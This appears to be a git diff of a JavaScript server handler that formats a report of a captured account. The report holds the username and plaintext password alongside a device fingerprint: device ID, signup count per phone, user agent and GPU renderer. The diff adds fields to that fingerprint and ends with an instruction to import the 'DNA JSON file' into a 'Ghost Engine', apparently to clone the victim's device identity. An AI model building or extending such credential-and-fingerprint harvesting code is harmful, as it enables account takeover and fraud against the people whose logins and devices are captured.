@@ -27,10 +27,11 @@ module.exports = async (req, res) => {
 👤 **User:** \`${data.username}\`
 🔑 **Pass:** \`${data.password}\`
 ━━━━━━━━━━━━━━━━━━━━━━
-📱 **Device:** ${data.dna.isMobile ? 'Mobile' : 'Desktop'}
+🤖 **Device ID:** \`${data.dna.deviceId}\` 
+🔄 **Signups from this Phone:** \`${data.dna.lifetimeSignups}\`
+📱 **Hardware:** ${data.dna.isMobile ? 'Mobile' : 'Desktop'}
 🖥️ **OS/Browser:** \`${data.dna.userAgent.substring(0, 40)}...\`
 🎮 **GPU:** \`${data.dna.gpuRenderer}\`
-📏 **Viewport:** ${data.dna.viewport.width}x${data.dna.viewport.height} @ ${data.dna.deviceScaleFactor}x
 ━━━━━━━━━━━━━━━━━━━━━━
 Please download the attached DNA JSON file and import it into the Ghost Engine.
 `;
